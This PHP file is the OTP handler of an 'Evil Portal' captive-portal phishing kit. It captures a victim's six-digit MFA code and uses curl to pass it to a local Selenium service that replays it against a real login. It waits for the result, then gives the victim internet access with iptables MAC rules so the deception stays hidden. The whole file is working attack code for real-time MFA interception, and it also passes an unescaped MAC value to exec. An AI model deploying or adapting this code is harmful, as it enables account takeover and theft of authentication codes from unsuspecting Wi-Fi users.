<?php
// mfa_handler.php - handles OTP submission from mfa.html
mkdir("/root/logs", 0755, true);

function getClientMac($clientIP) {
    return trim(exec("grep " . escapeshellarg($clientIP) . " /tmp/dhcp.leases | awk '{print \$2}'"));
}

function grantInternetAccess($client_ip) {
    $client_mac = getClientMac($client_ip);

    // Grant internet access
    file_put_contents('/tmp/EVILPORTAL_CLIENTS.txt', $client_ip . "\n", FILE_APPEND);

    if (!empty($client_mac)) {
        exec("iptables -t nat -I PREROUTING -m mac --mac-source $client_mac -j ACCEPT");
        exec("iptables -I FORWARD -m mac --mac-source $client_mac -j ACCEPT");
    }
}

// Function to wait for MFA result from Selenium
function waitForMfaResult($timeout = 30) {
    $status_file = '/tmp/mfa_result.txt';
    $start_time = time();

    // Clear any existing status
    if (file_exists($status_file)) {
        unlink($status_file);
        error_log("Cleared existing mfa_result.txt file");
    }

    error_log("Starting to wait for MFA result file: " . $status_file);

    while ((time() - $start_time) < $timeout) {
        if (file_exists($status_file)) {
            $status = trim(file_get_contents($status_file));
            error_log("Found MFA result file with status: " . $status);
            return $status;
        }
        usleep(500000); // Wait 0.5 seconds

        // Log every few seconds
        if ((time() - $start_time) % 3 == 0) {
            error_log("Still waiting for MFA result... elapsed: " . (time() - $start_time) . "s");
        }
    }

    error_log("Timeout waiting for MFA result after " . $timeout . " seconds");
    return 'mfa_failed';
}

// Get client IP for session tracking
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$session_file = "/tmp/mfa_attempts_" . md5($client_ip);

// Get current attempt count
$attempt_count = 1;
if (file_exists($session_file)) {
    $attempt_count = (int)file_get_contents($session_file) + 1;
}

// Get OTP from POST
$otp = $_POST['otp'] ?? '';

error_log("MFA handler called with OTP: " . $otp . " from IP: " . $client_ip . " (attempt #" . $attempt_count . ")");

if ($otp && strlen($otp) === 6) {
    // Update attempt counter
    file_put_contents($session_file, $attempt_count);
    
    // Send OTP to monitoring server
    $monitor_endpoint = "http://localhost:9999/submit-otp";
    $otp_encoded = urlencode($otp);
    error_log("Sending OTP to Selenium: " . $monitor_endpoint . "?otp=" . $otp_encoded);

    exec("curl -s '$monitor_endpoint?otp=$otp_encoded' > /dev/null 2>&1 &");

    // Wait for Selenium to validate the OTP
    $mfa_result = waitForMfaResult(30);
    error_log("MFA result received: " . $mfa_result);

    if ($mfa_result === 'mfa_success') {
        // MFA successful - clear attempt counter and grant internet access
        if (file_exists($session_file)) {
            unlink($session_file);
        }
        error_log("MFA validation successful, granting internet access");
        grantInternetAccess($client_ip);
        header("Location: /success.html");
    } else {
        // MFA failed - check attempt count
        error_log("MFA validation failed (attempt #" . $attempt_count . "/3)");
        
        if ($attempt_count >= 3) {
            // Too many failed attempts - clear session and redirect to login
            if (file_exists($session_file)) {
                unlink($session_file);
            }
            error_log("Maximum MFA attempts exceeded, redirecting to login page");
            
            // Also clear any login session to force fresh start
            $login_session_files = glob("/tmp/processed_*");
            foreach ($login_session_files as $file) {
                unlink($file);
            }
            
            header("Location: /mfa_failed.html?mfa_exceeded=1");
        } else {
            // Still have attempts left - back to MFA page with error
            header("Location: /mfa.html?error=1&attempts=" . $attempt_count);
        }
    }
} else {
    // Invalid OTP format - increment attempt counter
    file_put_contents($session_file, $attempt_count);
    error_log("Invalid OTP length: " . strlen($otp) . " (attempt #" . $attempt_count . "/3)");
    
    if ($attempt_count >= 3) {
        // Too many failed attempts
        if (file_exists($session_file)) {
            unlink($session_file);
        }
        error_log("Maximum MFA attempts exceeded, redirecting to login page");
        
        // Clear any login session to force fresh start
        $login_session_files = glob("/tmp/processed_*");
        foreach ($login_session_files as $file) {
            unlink($file);
        }
        
        header("Location: /mfa_failed.html?mfa_exceeded=1");
    } else {
        header("Location: /mfa.html?error=1&attempts=" . $attempt_count);
    }
}
exit;
?>
